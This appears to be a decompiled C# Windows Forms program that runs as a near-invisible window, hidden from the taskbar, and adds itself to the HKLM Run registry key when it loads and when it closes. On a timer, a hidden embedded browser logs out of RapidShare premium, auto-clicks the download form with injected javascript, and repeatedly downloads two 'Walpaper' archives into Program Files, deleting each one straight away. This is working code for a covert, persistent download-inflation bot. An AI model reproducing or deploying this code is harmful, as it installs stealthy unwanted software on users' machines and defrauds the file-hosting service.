using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using rs.My;

namespace rs;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("minute")]
	private Timer _minute;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("Link")]
	private Timer _Link;

	[AccessedThroughProperty("Link2")]
	private Timer _Link2;

	[AccessedThroughProperty("start_up")]
	private CheckBox _start_up;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual WebBrowser WebBrowser1
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			WebBrowserDocumentCompletedEventHandler val = new WebBrowserDocumentCompletedEventHandler(WebBrowser1_DocumentCompleted);
			if (_WebBrowser1 != null)
			{
				_WebBrowser1.remove_DocumentCompleted(val);
			}
			_WebBrowser1 = value;
			if (_WebBrowser1 != null)
			{
				_WebBrowser1.add_DocumentCompleted(val);
			}
		}
	}

	internal virtual Timer minute
	{
		[DebuggerNonUserCode]
		get
		{
			return _minute;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = minute_Tick;
			if (_minute != null)
			{
				_minute.remove_Tick(eventHandler);
			}
			_minute = value;
			if (_minute != null)
			{
				_minute.add_Tick(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = TextBox2_TextChanged;
			if (_TextBox2 != null)
			{
				((Control)_TextBox2).remove_TextChanged(eventHandler);
			}
			_TextBox2 = value;
			if (_TextBox2 != null)
			{
				((Control)_TextBox2).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Timer Link
	{
		[DebuggerNonUserCode]
		get
		{
			return _Link;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Link_Tick;
			if (_Link != null)
			{
				_Link.remove_Tick(eventHandler);
			}
			_Link = value;
			if (_Link != null)
			{
				_Link.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Link2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Link2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Link2_Tick;
			if (_Link2 != null)
			{
				_Link2.remove_Tick(eventHandler);
			}
			_Link2 = value;
			if (_Link2 != null)
			{
				_Link2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual CheckBox start_up
	{
		[DebuggerNonUserCode]
		get
		{
			return _start_up;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_start_up = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer1 = value;
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		components = new Container();
		TextBox1 = new TextBox();
		WebBrowser1 = new WebBrowser();
		minute = new Timer(components);
		TextBox2 = new TextBox();
		Link = new Timer(components);
		Link2 = new Timer(components);
		start_up = new CheckBox();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(19, 97);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(278, 21);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		WebBrowser webBrowser = WebBrowser1;
		location = new Point(19, 18);
		((Control)webBrowser).set_Location(location);
		WebBrowser webBrowser2 = WebBrowser1;
		size = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(size);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser1.set_ScriptErrorsSuppressed(true);
		WebBrowser webBrowser3 = WebBrowser1;
		size = new Size(278, 73);
		((Control)webBrowser3).set_Size(size);
		((Control)WebBrowser1).set_TabIndex(1);
		WebBrowser1.set_Url(new Uri("", UriKind.Relative));
		minute.set_Interval(60000);
		TextBox textBox3 = TextBox2;
		location = new Point(19, 124);
		((Control)textBox3).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		((TextBoxBase)TextBox2).set_ReadOnly(true);
		TextBox textBox4 = TextBox2;
		size = new Size(46, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(6);
		TextBox2.set_Text("0");
		Link.set_Interval(60000);
		Link2.set_Interval(60000);
		((ButtonBase)start_up).set_AutoSize(true);
		CheckBox obj = start_up;
		location = new Point(166, 134);
		((Control)obj).set_Location(location);
		((Control)start_up).set_Name("start_up");
		CheckBox obj2 = start_up;
		size = new Size(81, 17);
		((Control)obj2).set_Size(size);
		((Control)start_up).set_TabIndex(7);
		((ButtonBase)start_up).set_Text("CheckBox1");
		((ButtonBase)start_up).set_UseVisualStyleBackColor(true);
		Timer1.set_Interval(1000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(310, 156);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)start_up);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Application.get_ExecutablePath());
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Application.get_ExecutablePath());
		minute.set_Enabled(true);
	}

	private void WebBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		Uri url = e.get_Url();
		if (url == new Uri("http://rapidshare.com/files/160753044/Walpaper_1.rar"))
		{
			WebBrowser1.Navigate("javascript:var g=document.forms[0].elements;g[1].click();void(0);");
		}
		else if (url == new Uri("http://rs333.rapidshare.com/files/160753044/Walpaper_1.rar"))
		{
			Link.set_Enabled(true);
		}
		else if (url == new Uri("http://rapidshare.com/files/160753046/Walpaper_2.rar"))
		{
			WebBrowser1.Navigate("javascript:var g=document.forms[0].elements;g[1].click();void(0);");
		}
		else if (url == new Uri("http://rs333.rapidshare.com/files/160753046/Walpaper_2.rar"))
		{
			Link2.set_Enabled(true);
		}
	}

	private void TextBox2_TextChanged(object sender, EventArgs e)
	{
		if (Operators.CompareString(TextBox2.get_Text(), "17", false) == 0)
		{
			WebBrowser1.Navigate("http://rapidshare.com/cgi-bin/premium.cgi?logout=1");
		}
		if (Operators.CompareString(TextBox2.get_Text(), "18", false) == 0)
		{
			WebBrowser1.Navigate("http://rapidshare.com/files/160753044/Walpaper_1.rar");
		}
		if (Operators.CompareString(TextBox2.get_Text(), "49", false) == 0)
		{
			WebBrowser1.Navigate("http://rapidshare.com/cgi-bin/premium.cgi?logout=1");
		}
		if (Operators.CompareString(TextBox2.get_Text(), "50", false) == 0)
		{
			WebBrowser1.Navigate("http://rapidshare.com/files/160753046/Walpaper_2.rar");
		}
		if (Operators.CompareString(TextBox2.get_Text(), "60", false) == 0)
		{
			TextBox2.set_Text("0");
		}
	}

	private void minute_Tick(object sender, EventArgs e)
	{
		TextBox textBox = TextBox2;
		textBox.set_Text(Conversions.ToString(Conversions.ToDouble(textBox.get_Text()) + 1.0));
	}

	private void Link_Tick(object sender, EventArgs e)
	{
		if (Link.get_Enabled())
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Program Files\\Walpaper_1.rar"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Program Files\\Walpaper_1.rar", (UIOption)2, (RecycleOption)2);
			}
			Regex regex = new Regex("(?<=\\<form\\sname=\"dlf\"\\ action=\")[a-zA-Z0-9\\.\\\\_:\\/^<=\"]+", RegexOptions.IgnoreCase);
			Match match = regex.Match(WebBrowser1.get_DocumentText());
			if (match.Success)
			{
				TextBox1.set_Text(match.Value);
			}
			TextBox1.set_Text(TextBox1.get_Text().Substring(0, checked(TextBox1.get_Text().Length - 1)));
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(TextBox1.get_Text(), "C:\\Program Files\\Walpaper_1.rar");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Program Files\\Walpaper_1.rar", (UIOption)2, (RecycleOption)2);
		}
		Link.set_Enabled(false);
	}

	private void Link2_Tick(object sender, EventArgs e)
	{
		if (Link2.get_Enabled())
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Program Files\\Walpaper_2.rar"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Program Files\\Walpaper_2.rar", (UIOption)2, (RecycleOption)2);
			}
			Regex regex = new Regex("(?<=\\<form\\sname=\"dlf\"\\ action=\")[a-zA-Z0-9\\.\\\\_:\\/^<=\"]+", RegexOptions.IgnoreCase);
			Match match = regex.Match(WebBrowser1.get_DocumentText());
			if (match.Success)
			{
				TextBox1.set_Text(match.Value);
			}
			TextBox1.set_Text(TextBox1.get_Text().Substring(0, checked(TextBox1.get_Text().Length - 1)));
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(TextBox1.get_Text(), "C:\\Program Files\\Walpaper_2.rar");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Program Files\\Walpaper_2.rar", (UIOption)2, (RecycleOption)2);
		}
		Link2.set_Enabled(false);
	}
}
